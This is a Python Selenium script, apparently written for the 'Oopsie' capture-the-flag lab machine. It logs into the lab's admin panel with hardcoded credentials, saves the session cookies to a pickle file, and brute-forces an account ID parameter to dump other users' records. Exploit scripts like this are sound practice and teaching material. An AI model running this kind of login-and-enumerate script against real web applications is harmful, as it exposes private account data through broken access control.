import pickle # store cookies
from selenium import webdriver # Needed because website uses javascript to render the output we need
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

import time

#chrome_options = Options()
#chrome_options.add_argument("user-data-dir=selenium") # persist cookies
#chrome_options.add_argument('--ignore-certificate-errors')
#chrome_options.add_argument("--test-type")
#driver = webdriver.Chrome(chrome_options=chrome_options)
driver = webdriver.Firefox()

usern = 'admin'
passw = 'MEGACORP_4dm1n!!'

# Start a session to save cookies
loginURL = "http://10.10.10.28/cdn-cgi/login/index.php"
driver.get(loginURL)

username = driver.find_element_by_name('username')
username.send_keys(usern) # input usern into username field

password = driver.find_element_by_name('password')
password.send_keys(passw) # input passw into password field

# Login 
driver.find_element_by_class_name('state').click()

#print(driver.find_element_by_xpath("html").text)
pickle.dump(driver.get_cookies(), open('oopsie.pkl', "wb")) # dump cookies to file in case we need them later

## ENUMERATION ##
delay = 3
URL = "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id="
print("[i] Enumerating " + URL + "...")
for i in range(1, 100):
    URLtoBrute = URL + str(i)
    driver.get(URLtoBrute)

    # wait until the table (which we need) is rendered
    try:
        _ = WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "//table[1]")))
    except TimeoutException:
        print("[ERROR] Timeout!")

    # print the text within the table
    try:
        print("[" + str(i) + "] " + driver.find_element_by_xpath("//table[1]").text)
    except:
        print("[ERROR] No table found!")
    time.sleep(0.05) # Avoid flooding server

